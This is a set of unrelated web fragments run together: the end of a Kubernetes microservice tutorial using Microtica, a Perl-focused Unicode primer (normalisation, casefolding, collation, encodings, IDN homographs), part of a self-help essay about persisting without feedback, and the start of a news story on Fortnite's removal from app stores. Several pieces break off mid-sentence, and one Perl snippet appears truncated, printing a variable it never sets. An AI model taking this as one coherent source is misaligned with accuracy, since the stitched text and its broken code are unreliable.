<p>With the configuration set in place, you can deploy your environment by clicking <em>Create Plan</em>. Here you will see a detailed listing of the resources that are about to be added to the environment. Confirming will initiate the deployment and lead you to a page where you can follow the logs and events that are happening. Setting up this infrastructure can take up to 15 mins, so let us get started with our microservice in the meantime.</p>



<h3><strong>4. Create a microservice</strong></h3>



<p>For the purposes of this example, we will be using a simple <a rel="noreferrer noopener" href="https://hub.docker.com/_/hello-world" target="_blank">Hello World microservice</a> available in Docker hub. First, go to <a rel="noreferrer noopener" href="https://portal.microtica.com/microservices/create" target="_blank"><em>Microservices/Create microservice</em></a><em> </em>and follow the wizard in Microtica. For a source select public docker image and paste <strong>hello-world</strong>. Then, click <em>Next</em>, then <em>Create Microservice </em>and now we have our microservice.</p>

<p>As a result of using a docker image as a source, we already have a built artifact so we can immediately deploy it in the Kubernetes cluster. <strong>You can do this from <em>Microservice details — Add to Cluster</em>, or in the<em> Kubernetes Dashboard — Microservices — Deploy.</em></strong></p>

<p>Microtica offers configuration options when deploying your microservice in a Kubernetes Cluster.&nbsp;&nbsp;You can select the scaling options, and as well setup continuous delivery for your microservice.</p>



<p>After successfully deploying the microservice in the Kubernetes Cluster you can preview your microservice by following the <strong><em>Access URL/hello-world-ms</em></strong><em> </em>(the name of the service if you’ve changed it). You should see this in your browser window:</p>



<div><figure><img src="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/0KLYx9DQIHY9wBiN8.png" alt="Your first microservice on a Kubernetes cluster
"></figure></div>



<p><strong>AND WE ARE DONE! WE JUST DEPLOYED OUR FIRST MICROSERVICE ON A KUBERNETES CLUSTER 👏</strong></p>



<h3><strong>5. Bonus: Cleanup</strong></h3>



<p>To remove all the resources we created on your AWS account go to environment details and in the menu select <em>Undeploy. </em>As a result, you’ll get your resources created on AWS cleaned. However, you will still have the configuration in Microtica in case you want to deploy it in the cloud again.</p>

      <!-- /.post-info -->      <h2>Why</h2>
<p>One encoding covering <em>most</em> of the world’s writing systems. Standard
encoding of the web, most operating systems, Java and .NET.</p>
<p>Before Unicode, each script (or script family) had its own encoding, or
worse, lots of different incompatible encodings. Unicode is a superset
of almost all of them, so can be used for interchange.</p>
<p>It’s been around for <a href="http://www.unicode.org/history/unicode88.pdf">over 30 years</a>.</p>
<p><em>Note: code examples are Perl-centric so far, because it has really good Unicode
support and I know it; if you have examples for other languages, please do post
a comment!</em></p>
<h2>What</h2>
<p><img alt="Unicode character examples" src="https://richardjharris.github.io/static/images/unichar-examples.png"></p>
<p>Unicode defines a <em>code point</em> (number) for every character, such as <span><span data-code="0061" data-name="LATIN SMALL LETTER A" title="LATIN SMALL LETTER A (U+0061)">a</span></span>, <span><span data-code="00E3" data-name="LATIN SMALL LETTER A WITH TILDE" title="LATIN SMALL LETTER A WITH TILDE (U+00E3)">ã</span></span>,
<span><span data-code="06D0" data-name="ARABIC LETTER E" title="ARABIC LETTER E (U+06D0)">ې</span></span>, <span><span data-code="4E0D" data-name="CJK UNIFIED IDEOGRAPH-4E0D" title="CJK UNIFIED IDEOGRAPH-4E0D (U+4E0D)">不</span></span> and <span><span data-code="2603" data-name="SNOWMAN" title="SNOWMAN (U+2603)">☃</span></span>. As of <a href="http://www.unicode.org/versions/Unicode6.2.0/">Unicode 6.2</a> there are <strong>109,976</strong> code points!
<em>(You can mouseover any highlighted character for more information.)</em></p>
<p>It also includes <em>combining characters</em> such as <span><span data-code="0300" data-name="COMBINING GRAVE ACCENT" title="COMBINING GRAVE ACCENT (U+0300)">◌̀</span></span> which can be added to
other characters; this way, Unicode does not need a code point for every possible
combination of letter and accent. On the other hand, Unicode <em>generally</em> doesn’t care
about fonts or stylistic differences: it gives <img alt="a (double-story)" src="https://richardjharris.github.io/static/images/a1.png">
and <img alt="a (single-story)" src="https://richardjharris.github.io/static/images/a2.png"> the same codepoint.</p>
<p>It’s <em>more than just a character set</em>: it also covers standard encodings such
as UTF-8; <nobr>lower/upper/title</nobr> case mapping; collation (sorting); line breaks;
rendering; right-to-left script handling, and more.</p>
<h2>Normalization</h2>
<p>For compatibility with other encodings Unicode sometimes includes <em>precomposed</em>
versions of characters, for example, these three:</p>
<ul>
<li><span><span data-code="00C5" data-name="LATIN CAPITAL LETTER A WITH RING ABOVE" title="LATIN CAPITAL LETTER A WITH RING ABOVE (U+00C5)">Å</span><span> LATIN CAPITAL LETTER A WITH RING ABOVE (U+00C5)</span></span></li>
<li><span><span data-code="212B" data-name="ANGSTROM SIGN" title="ANGSTROM SIGN (U+212B)">Å</span><span> ANGSTROM SIGN (U+212B)</span></span></li>
<li><span><span data-code="0041" data-name="LATIN CAPITAL LETTER A" title="LATIN CAPITAL LETTER A (U+0041)">A</span><span> LATIN CAPITAL LETTER A (U+0041)</span></span> + <span><span data-code="030A" data-name="COMBINING RING ABOVE" title="COMBINING RING ABOVE (U+030A)">◌̊</span><span> COMBINING RING ABOVE (U+030A)</span></span></li>
</ul>
<p>For these to be treated as the same string in equality tests etc. you should
run all input through <a href="http://unicode.org/reports/tr15/">Unicode normalisation</a>. The most common form is
<abbr title="Normalisation Form C (canonical decomposition + canonical composition)">NFC</abbr>, which uses pre<strong>C</strong>omposed characters where possible, and defines a strict ordering
of diacritics if more than one exists. <abbr title="Normalization Form D (canonical decomposition)">NFD</abbr> <strong>D</strong>ecomposes characters where possible.<sup id="fnref:gory"><a href="#fn:gory" rel="footnote">1</a></sup></p>
<p>It doesn’t matter what form you use as long as you are consistent; NFD is
faster in general (fewer codepoints) and <a href="http://stackoverflow.com/a/6163129/74496">tchrist</a> suggests running input
through NFD and output through NFC.</p>
<p><strong>Compatibility decomposition</strong> also maps characters such as <span><span data-code="FB03" data-name="LATIN SMALL LIGATURE FFI" title="LATIN SMALL LIGATURE FFI (U+FB03)">ﬃ</span></span>, <span><span data-code="2168" data-name="ROMAN NUMERAL NINE" title="ROMAN NUMERAL NINE (U+2168)">Ⅸ</span></span>
and even <span><span data-code="2075" data-name="SUPERSCRIPT FIVE" title="SUPERSCRIPT FIVE (U+2075)">⁵</span></span> to ‘ffi’, ‘IX’ and ‘5’ respectively. This <abbr title="Normalization Form KC (compatibility decomposition + canonical composition)">NFKC</abbr> normalisation
helps when searching for text.</p>

<h2>Casefolding</h2>
<p>Casing is not so simple in the Unicode world:</p>
<ul>
<li>
<p>Some strings actually change length when they change case: <span><span data-code="00DF" data-name="LATIN SMALL LETTER SHARP S" title="LATIN SMALL LETTER SHARP S (U+00DF)">ß</span></span> uppercases
  to ‘SS’.</p>
</li>
<li>
<p><span><span data-code="017F" data-name="LATIN SMALL LETTER LONG S" title="LATIN SMALL LETTER LONG S (U+017F)">ſ</span><span> LATIN SMALL LETTER LONG S</span></span> should be seen as equal to ‘s’ and ‘S’ in case-insensitive comparisons.</p>
</li>
<li>
<p><span><span data-code="03A3" data-name="GREEK CAPITAL LETTER SIGMA" title="GREEK CAPITAL LETTER SIGMA (U+03A3)">Σ</span><span> GREEK CAPITAL LETTER SIGMA</span></span> has <em>two</em> lowercase forms: <span><span data-code="03C3" data-name="GREEK SMALL LETTER SIGMA" title="GREEK SMALL LETTER SIGMA (U+03C3)">σ</span></span> at the beginning or middle of the
  word, and <span><span data-code="03C2" data-name="GREEK SMALL LETTER FINAL SIGMA" title="GREEK SMALL LETTER FINAL SIGMA (U+03C2)">ς</span></span> at the end of a word.</p>
</li>
<li>
<p>Casing is <em>mostly</em> consistent across locales, but Turkish is an exception: it
  has both a <a href="https://en.wikipedia.org/wiki/Dotted_and_dotless_I">Dotted and dotless I</a>, in both lower and upper cases.</p>
</li>
</ul>
<p>To ensure your code handles these cases, and any new ones, Unicode provides a
<em>one-way</em> ‘casefold’ operation that allows case-insensitive comparison:</p>
<div><pre><span>#!/usr/bin/perl</span>
<span>use</span> <span>Unicode::</span><span>CaseFold</span><span>;</span>   <span># or: use v5.16;</span>
<span>sort</span> <span>{</span> <span>fc</span><span>(</span><span>$a</span><span>)</span> <span>cmp</span> <span>fc</span><span>(</span><span>$b</span><span>)</span> <span>}</span> <span>@stuff</span><span>;</span>
</pre></div>


<p>Casefolding does <em>not</em> include normalization, so do that too.</p>
<h2>Sorting</h2>
<p>Sorting (or <em>collation</em>) is <strong>locale specific</strong> and just as riddled with
pecularities as casing:</p>
<ul>
<li>
<p>German and Swedish both have ä and ö but sort them differently - German
    treats them as variants of the same letters without umlauts (i.e. ‘a<strong>ä</strong>bcdefghijklmno<strong>ö</strong>pqrstuvwxyz’)
    whereas Swedish considers them new letters, and puts them at the end (‘abcdefghijklmnopqrstuvwxyz<strong>äö</strong>‘)</p>
<p>It’s important that things are sorted in the order the user expects.</p>
</li>
<li>
<p>Sorting varies by application too; phonebooks are often sorted differently to book
    indices, for example.</p>
</li>
<li>
<p>For Chinese characters and other ideographs, there are many possible orders, e.g.
    pinyin (phonetic), by stroke count, etc.</p>
</li>
<li>
<p>Collations can be <em>tailored</em> based on user preferences, e.g. lower or upper-case first?</p>
</li>
</ul>
<p>It’s not enough to just sort by binary comparison. And codepoints aren’t generally in any
sensible order either. Fortunately Unicode specifies a <a href="http://www.unicode.org/reports/tr10/">Collation Algorithm</a>
that is immensely customisable, covers all the edge-cases, and does clever things to make
it reasonably fast. Here’s an example:<sup id="fnref:locale"><a href="#fn:locale" rel="footnote">2</a></sup></p>
<div><pre><span>#!/usr/bin/perl</span>
<span>use</span> <span>Unicode::Collate::</span><span>Locale</span><span>;</span>
<span>my</span> <span>$collator</span> <span>=</span> <span>Unicode::Collate::</span><span>Locale</span><span>-&gt;</span><span>new</span><span>(</span><span>locale</span> <span>=&gt;</span> <span>'DE'</span><span>);</span>
<span>my</span> <span>@sorted</span> <span>=</span> <span>$collator</span><span>-&gt;</span><span>sort</span><span>(</span><span>@array</span><span>);</span>
<span>$collator</span><span>-&gt;</span><span>cmp</span><span>(</span><span>$word</span><span>,</span> <span>$another_word</span><span>);</span>  <span># -&gt; -1, 0 or 1</span>
</pre></div>


<p>The <abbr title="Unicode Collation Algorithm">UCA</abbr> can do other clever things, such as sort ‘10’ after ‘2’ numerically, or sort
the character ‘?’ as if it was the string ‘question mark’.</p>
<h2>Encodings</h2>
<p>The big ones are <code>UTF-8</code>, <code>UTF-16</code> and <code>UTF-32</code>. Each one guarantees a reversible
mapping of almost every codepoint<sup id="fnref:every"><a href="#fn:every" rel="footnote">3</a></sup> to a byte sequence.</p>
<ul>
<li>
<p><strong>UTF-32</strong> is dead simple: each codepoint gets four bytes. Takes up tons of space,
  not recommended for interchange.</p>
</li>
<li>
<p><strong>UTF-8</strong> is very common the web. It’s byte-oriented (no endianness issues),
  handles corruption well, is ASCII-compatible and takes up minimal space for text
  that is mostly ASCII (e.g. HTML).</p>
<ul>
<li>
<p>Code points between U+0800 and U+FFFF, which includes commonly used <abbr title="Chinese, Japanese, Korean and Vietnamese">CJKV</abbr>
  characters, will take up 3 bytes instead of 2. So UTF-16 may be more space
  efficient.</p>
</li>
<li>
<p>ASCII-compatibility is helpful to allow UTF-8 to stealth its way through
  scripts and processes that are not Unicode-aware. But if such a system tries to
  do anything with the data (casing, sub-strings, regex), that data may be
  corrupted.</p>
</li>
</ul>
</li>
<li>
<p><strong>UTF-16</strong> is used by Java, .NET and Windows. It uses 2 bytes (16-bit) to
  represent the most common 63K codepoints, and 4 bytes for the less common 1M
  codepoints (using two ‘surrogate’ codepoints).</p>
<ul>
<li>
<p>Contrary to popular belief, UTF-16 is not a fixed-width encoding. But as
  long as it contains no surrogates, it can be treated as one, which can speed
  up string operations.</p>
</li>
<li>
<p>UTF-16 streams typically begin with <span><span data-code="FEFF" data-name="ZERO WIDTH NO-BREAK SPACE" title="ZERO WIDTH NO-BREAK SPACE (U+FEFF)">U+FEFF</span></span><sup id="fnref:bomnote"><a href="#fn:bomnote" rel="footnote">4</a></sup> to detect the endianness
  (byte order) of the stream. Otherwise, you can explicitly encode or decode
  via ‘UTF-16BE’ or ‘UTF-16LE’ to specify the endianness.</p>
</li>
</ul>
</li>
</ul>
<h2>Unicode and internationalised domain names</h2>
<p>International characters create a <a href="http://en.wikipedia.org/wiki/IDN_homograph_attack">big problem</a>
for domain names. Just as <span><span data-code="0049" data-name="LATIN CAPITAL LETTER I" title="LATIN CAPITAL LETTER I (U+0049)">I</span></span> and <span><span data-code="006C" data-name="LATIN SMALL LETTER L" title="LATIN SMALL LETTER L (U+006C)">l</span></span> look similar, Unicode multiplies that problem
by 1,000, in addition to adding numerous invisible control characters, spacing characters
and right-to-left text.</p>
<p>Browsers and registrars have implemented several measures against this:</p>
<ul>
<li>Many TLDs restrict which characters can be used in domain names.</li>
<li>Browsers may display the domain in Punycode (see below) if the domain includes characters
  from multiple scripts and/or characters not belonging to one of the user’s preferred languages.</li>
<li>Internationalised country codes such as .рф (Russia) only accept Cyrillic names.</li>
</ul>
<h3>nameprep/stringprep</h3>
<p><a href="http://tools.ietf.org/html/rfc3491">RFC 3491</a> defines <em>nameprep</em>, a mechanism
to case-fold, normalize and sanitize strings before they can be used in domain names. This
removes many invisible characters and throws an error if prohibited code points are in use.</p>
<p>It is implemented in terms of a wider framework called <em>stringprep</em>. In Perl, one can use
<a href="https://metacpan.org/module/Net::IDN::Encode">Net::IDN::Encode</a> which will also perform Punycode conversion.</p>
<h3>Punycode</h3>
<p>For legacy reasons DNS does not allow extended characters outside of ASCII, so Punycode
is an ASCII-compatible encoding scheme. For example, <code>café.com</code> becomes <code>xn--caf-dma.com</code>.
All Punycode-encoded domain components are instantly recognisable by their <code>xn--</code> prefix.</p>
<p>This goes for TLDs too: .中国 is really known as <em>xn—fiqs8s</em>.</p>
<h2>The problem of ‘user characters’</h2>
<p>In Perl at least, everything (<code>substr</code>, <code>length</code>, <code>index</code>, <code>reverse</code>…) works on the level
of codepoints. This is often not what you want, because what a user considers to be a
character such as ў is actually two codepoints (<span><span data-code="0079" data-name="LATIN SMALL LETTER Y" title="LATIN SMALL LETTER Y (U+0079)">y</span></span> + <span><span data-code="0306" data-name="COMBINING BREVE" title="COMBINING BREVE (U+0306)">◌̆</span></span>). Here’s a <a href="http://www.nntp.perl.org/group/perl.perl5.porters/2011/10/msg178687.html">really good
usenet post</a> on the subject.</p>
<p>Even seemingly innocuous things like <code>printf "%-10s", $str</code> breaks completely for combining characters,
double-width characters (e.g. Chinese/Japanese) or zero-width characters.</p>
<p>Fortunately Perl provides the <code>\X</code> regular expression metachar which matches exactly one
‘extended grapheme cluster’, i.e. what a user would consider a character to be. A more robust
solution is to install <a href="https://metacpan.org/module/Unicode::GCString">Unicode::GCString</a>:</p>
<div><pre><span>#!/usr/bin/perl</span>
<span>use</span> <span>Unicode::</span><span>GCString</span><span>;</span>
<span>use</span> <span>Unicode::</span><span>Normalize</span><span>;</span>
<span>use</span> <span>utf8</span><span>;</span>

<span>printf</span> <span>"%-25s|\n"</span><span>,</span> <span>$s</span><span>;</span>                          <span># 22 columns long (╯°□°）╯︵ ┻━┻</span>
</pre></div>


<h3>Line breaks</h3>
<p>Line breaking (or word wrapping) is another thing that becomes <a href="http://www.unicode.org/reports/tr14/">insanely complicated</a>
once Unicode is involved. You have to account for various non-breaking and breaking control
and spacing characters, punctuation in every language (e.g. <span><span data-code="00AB" data-name="LEFT-POINTING DOUBLE ANGLE QUOTATION MARK" title="LEFT-POINTING DOUBLE ANGLE QUOTATION MARK (U+00AB)">«</span></span> and <span><span data-code="00BB" data-name="RIGHT-POINTING DOUBLE ANGLE QUOTATION MARK" title="RIGHT-POINTING DOUBLE ANGLE QUOTATION MARK (U+00BB)">»</span></span> quotes, or the
full stop or comma being used in numerics such as <code>2,140</code>) and the width of each character.</p>
<p>In Perl, this has all been handled for you - just use <a href="https://metacpan.org/module/Unicode::LineBreak">Unicode::LineBreak</a>.</p>
<h2>Regular expressions</h2>
<p>Some useful Perl regular expression syntax:</p>
<dl>
<dt><code>\R</code></dt>
<dd>Match any Unicode linebreak sequence (including <code>\n</code>, <code>\r\n</code> and six others)</dd>
<dt><code>\p</code>, <code>\P</code></dt>
<dd>Match any codepoint possessing (or not possessing) a Unicode property.</dd>
<dd>Common ones are <code>\pL</code> (Letter), <code>\pU</code> (Uppercase), <code>\pS</code> (Symbol), or even <code>\p{script=Latin}</code>,
<code>\p{East_Asian_Width=Wide}</code>, <code>\p{Numeric_Value=4}</code>.</dd>
<dd>See <a href="http://perldoc.perl.org/perluniprops.html">perluniprops</a> for a big list.</dd>
<dd>Built-in character classes such as <code>\w</code>, <code>\b</code>, <code>\s</code> and <code>\d</code> are Unicode-aware since Perl
5.6 (though you need to make sure your string or pattern has the <code>UTF8</code> flag on!) Disable this
with the <code>/a</code> flag (see <a href="http://perldoc.perl.org/perlre.html#Character-set-modifiers">perlre</a>).</dd>
<dt><code>\X</code></dt>
<dd>Match an extended grapheme cluster, which is basically …</dd></dl></div></div>

Go do something else!”</p><p>Why was I feeling uninspired? Depressed?</p><p>I knew from the start that it will take time. That I’ll have to write for several years, at least, to get good returns. Yet, there I was, once again, questioning my efforts and <a href="https://durmonski.com/start-here/">my goals</a>. The more I thought about it, the more I realized how this thing that was trying to convince me that I should stop, is the same insidious force that was persuading millions of others around the world to abandon projects and/or end relationships.</p><h2>What Is The Main Reason You Abandon a Project?</h2><p>Most folks think it’s the lack of resources. Others are convinced that because they failed at product-market fit. A third group believes it’s because the competitor has a better product.</p><p>But often is something else.</p><p>Yes, you do need to have a good product. To satisfy a demand. To have an advantage over your competitors.

At first, the couple is constantly giving feedback to each other in forms of hugs and kisses. They talk for hours, go out, and are inseparable. At times, they even finish each other sentences – like in the movies.</p><figure><img width="1024" height="512" src="https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-1024x512.jpg" alt="getting-positive-feedback" srcset="https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-1024x512.jpg 1024w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-300x150.jpg 300w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-770x385.jpg 770w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-1536x768.jpg 1536w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-566x283.jpg 566w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-1151x575.jpg 1151w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-1481x740.jpg 1481w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-274x137.jpg 274w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-751x376.jpg 751w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-1381x691.jpg 1381w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Getting positive feedback from others means that what you do is worth pursuing further.</figcaption></figure><p>But after the initial honeymoon phase, after the thrill of the relationship has disappeared, they start to feel irritated from the smallest thing. Yes, at this stage, even a single unwashed dish can cause an argument.</p><p>It’s not so much that they stopped caring for each other, they simply stopped showing it.</p><figure><img width="1024" height="512" src="https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-1024x512.jpg" alt="getting-negative-feedback" srcset="https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-1024x512.jpg 1024w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-300x150.jpg 300w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-770x385.jpg 770w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-1536x768.jpg 1536w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-566x283.jpg 566w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-1151x575.jpg 1151w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-1481x740.jpg 1481w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-274x137.jpg 274w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-751x376.jpg 751w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-1381x691.jpg 1381w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>When you don’t get any good feedback from others, self-doubt consumes your mind.</figcaption></figure><p>Similar things happen when you start a project.</p><p>At first, you’re “in love” with the idea you want to materialize. You tell folks around you. You create mockups. You read stories of other people online who did similar things and, of course, succeeded.</p><p>All of these things are <em>feeding</em> your enthusiasm, giving you hope and more reasons to start the project. Invest money. And, even purchase online courses that promise to take your idea “to the next level”.</p><p>After the initial excitement, though, things start to take a different route. If you’re not part of the lucky 1% who are able to make it big on their product launch date, your passion slowly starts to decline.</p><p>Why?</p><p>Because not getting enough responses from other people about your work sucks.</p><p>While in the planning stage the feedback you received was mostly feed by your own desire to create what you wanted to create. When the project is live you now rely on outside people to give you boost. If such is not present – there are few or no orders, no one is liking your photos, people don’t reply to your emails – you start to lose motivation.</p><p>That’s why you want to quit and go do something else. Something more exciting. You convince yourself that this new thing will be “way better” and people will love it.</p><h2>Why Receiving Feedback is Important?</h2><p>As in a regular 9 to 5 job, if you work for a boss who doesn’t provide feedback, it’s easy to feel directionless. You start to wonder all sorts of things, “Is my performance good enough?”; “Should I focus more on A instead of B?”; “How can I get better at my work?”</p><p>Similar questions circle one’s mind when the caresses from their spouse stops, “Does he still loves me?”; “Why I’m no longer receiving lovely texts from him?”; “Am I getting older?”</p><p>In ancient times, when our ancestors first discovered fire, and even before that, tribes relied on cues from the environment to find food, useful tools, and avoid injuries from wild animals – a.k.a. losing an arm or being killed.</p><p>But not only this, from a biological standpoint, it makes sense to anticipate external feedback all the time. After all, the main function of the brain is to keep you well and alive.</p><p>During wars, people were constantly alarmed and conscious of their surroundings because they wanted to prevent themselves from being killed or badly injured.</p><p>This feedback loop is present all the time in different shapes and forms. Fortunately, getting caught in a crossfire or attacked by a wild animal is unlikely to happen nowadays. Our brains are now mainly worried about not getting validation from our own kind.</p><p>If you share a picture online and you get zero or not enough likes – whatever enough means for you – this translates into, “I’m not good enough.” The pressure to be socially accepted, online, can create a lasting feeling of unworthiness.</p><p>But measuring your self-worth by the number of likes is not a new discovery.<span id="easy-footnote-1-10677"></span><span><a href="#easy-footnote-bottom-1-10677" title="Validation seeking online has been around the block since social media was invented."><sup>1</sup></a></span> Yet, few people realize that the same thing carries over other important areas in our lives.</p><ul><li>Your spouse is no longer talking to you.</li><li>Your boss is rarely talking about your performance.</li><li>Your business is just a dusty place no one enters.</li></ul><p>No wonder you want to bail out. Go do something else to associate your I, <a aria-label="your ego (opens in a new tab)" href="https://durmonski.com/book-summaries/ego-is-the-enemy/" target="_blank" rel="noreferrer noopener">your ego</a>, with something “better” hoping that you’ll get recognition.</p><p>That’s also the reason people indulge in <a aria-label=" (opens in a new tab)" href="https://durmonski.com/well-being/internet-rabbit-holes/" target="_blank" rel="noreferrer noopener">careless scrolling</a>. If the project you’re working on is not getting the desired traction you start to doubt your own existence. That’s why we enter the artfully curated social media feeds to feel good about ourselves and escape the harsh reality.</p><p>But here’s the interesting part: The more time you can bear working on a project without getting external feedback the higher the chances of this thing to thrive and succeed.</p><p>The same applies to your relationships. If you can endure the arguments and don’t seek comfort in other people’s arms (i.e. cheat), you have a chance in creating a long-lasting marriage.</p><p>It’s quite a paradox. Half of the brain is logging for positive feedback to feed the ego while the other half is trying to stay reasonable and sane even when the first is not present.</p><h2>Getting Positive Feedback is The Main Desire of The Brain</h2><p>But it’s not only projects and relationships. Our brain is constantly seeking for positive cues. After all, the core goal of the whole body system is to keep you alive, make you feel good so you can survive for a longer period of time and pass your genes along.</p><p>What does all of this mean for our long term goals?</p><p>That if you want to make some positive changes in your life it will surely require enduring through long periods that are absent of any feedback – in a lot of cases both good and bad.</p><p>Want to lose weight and add a nice six-pack to your abs? It might take you months of starvation and hard exercises. During this transition period, the guy who stares at you back in the mirror is still going to be fat and asymmetrical.</p><p>Want to create a profitable online business? Despite praying to Google to show your content a bit higher in the search results you also have to write extremely good essays over a long period of time.</p><p>But I’m not here only to warn you about the loneliness and the years of hard work without immediate return. I’m here to help.</p><p>Here’s what you can do to make your journey to what you want to become, create, or whatever, a bit more bearable…</p><h2>How Can You Cope With Not Getting Feedback For Your Project?</h2><h3>Create Visual Feedback Loops</h3><p>“Don’t break the chain!” said Jerry Seinfeld when asked how he was able to keep delivering amazing jokes to people around the world.<span id="easy-footnote-2-10677"></span><span><a href="#easy-footnote-bottom-2-10677" title="A lot of people call it <a href=&quot;https://jamesclear.com/stop-procrastinating-seinfeld-strategy&quot; target=&quot;_blank&quot; aria-label=&quot;The Seinfeld Strategy (opens in a new tab)&quot; rel=&quot;noreferrer noopener&quot; class=&quot;ek-link&quot;>The Seinfeld Strategy</a>."><sup>2</sup></a></span></p><p>He’s famous for his practice of writing jokes daily and checking off boxes on a calendar.</p><p>Jerry Seinfeld famously said, “Do something related to your craft every day, no matter how small the action is.”</p><p>That’s the first tactic that will help you cope with the lack of feedback when you want to create a business or adopt a new habit.</p><p>The idea is to create a visual representation of the progress you’re making.</p><figure><img width="1024" height="512" src="https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-1024x512.jpg" alt="Don't-break-the-chain" srcset="https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-1024x512.jpg 1024w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-300x150.jpg 300w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-770x385.jpg 770w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-1536x768.jpg 1536w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-566x283.jpg 566w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-1151x575.jpg 1151w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-1481x740.jpg 1481w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-274x137.jpg 274w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-751x376.jpg 751w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain-1381x691.jpg 1381w, https://durmonski.com/wp-content/uploads/2020/08/Dont-break-the-chain.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>Writing or exercising regularly is a good idea on paper, but you can easily lose motivation when you feel tired or when the weather outside is giving you blues.</p><p>Things feel quite different once you have a graph that’s showing your progress.

After all, you don’t want to feel like the previous days were wasted, right?</p><p>That’s the simplest strategy you can create, today, to move the needle closer to where you want to go.</p><h3>Find a Support Group</h3><p>The second tactic that you can use to handle the dry periods that are absent of feedback is to join a group that will keep you accountable.</p><figure><img width="1024" height="512" src="https://durmonski.com/wp-content/uploads/2020/08/support-group-1024x512.jpg" alt="support-group" srcset="https://durmonski.com/wp-content/uploads/2020/08/support-group-1024x512.jpg 1024w, https://durmonski.com/wp-content/uploads/2020/08/support-group-300x150.jpg 300w, https://durmonski.com/wp-content/uploads/2020/08/support-group-770x385.jpg 770w, https://durmonski.com/wp-content/uploads/2020/08/support-group-1536x768.jpg 1536w, https://durmonski.com/wp-content/uploads/2020/08/support-group-566x283.jpg 566w, https://durmonski.com/wp-content/uploads/2020/08/support-group-1151x575.jpg 1151w, https://durmonski.com/wp-content/uploads/2020/08/support-group-1481x740.jpg 1481w, https://durmonski.com/wp-content/uploads/2020/08/support-group-274x137.jpg 274w, https://durmonski.com/wp-content/uploads/2020/08/support-group-751x376.jpg 751w, https://durmonski.com/wp-content/uploads/2020/08/support-group-1381x691.jpg 1381w, https://durmonski.com/wp-content/uploads/2020/08/support-group.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>I know. You probably heard it before. But having someone waiting for you to get the job done is a butt-kicker. You can handle disappointing yourself in most of the cases. But disappointing someone else?

Epic released the parody of Apple's famous '1984' television ad after Apple Inc. removed the game from its App Store for violating the company's in-app payment guidelines.<!-- --> <!-- -->(Epic Games/Reuters)</figcaption></figure><p><span><p>Apple Inc. and Alphabet Inc.'s Google on Thursday removed popular video game<em> Fortnite</em>&nbsp;from their app stores for violating the companies' in-app payment guidelines, prompting developer Epic Games to file federal antitrust lawsuits challenging the two companies' rules.</p>  <p>Apple and Google cited a direct payment feature rolled out on the Fortnite app earlier on Thursday as the violation.</p>  <p>Epic sued in U.S. court seeking no money from Apple or Google but rather injunctions that would end many of the companies' practices related to their app stores.</p>  <p>"Apple has become what it once railed against: the behemoth seeking to control markets, block competition, and stifle innovation. Apple is bigger, more powerful, more entrenched, and more pernicious than the monopolists of yesteryear," Epic said in its lawsuit, filed in the Northern District of California.</p>  <h2>Epic attacks Apple on social media</h2>  <p>Epic also attacked Apple on social media, launching a campaign with the hashtag #FreeFortnite, urging players to seek refunds from Apple if they lose access to the game, and creating a <a href="http://www.youtube.com/watch?v=euiSHuaw6Q4" target="_blank">parody</a> of Apple's famous <a href="http://www.youtube.com/watch?v=VtvjbmoDx-I" target="_blank">"1984"&nbsp;television ad</a>.</p>  <p>In the parody, which quickly garnered hundreds of thousands of views, a female <em>Fortnite </em>fighter hurls a unicorn-shaped club to smash a screen on which an Apple-headed character speaks of "the anniversary of the platform unification directives."</p>  <p><span><blockquote lang="en"><p>Epic Games has defied the App Store Monopoly. In retaliation, Apple is blocking Fortnite from a billion devices. &lt;br&gt;&lt;br&gt;Visit &lt;a href="https://t.co/K3S07w5uEk"&gt;https://t.co/K3S07w5uEk&lt;/a&gt; and join the fight to stop 2020 from becoming "1984" &lt;a href="https://t.co/tpsiCW4gqK"&gt;https://t.co/tpsiCW4gqK&lt;/a&gt;</p>&amp;mdash;<a href="https://twitter.com/FortniteGame/status/1294006412931223552">@FortniteGame</a></blockquote></span></p>  <p>Apple takes a cut of between 15 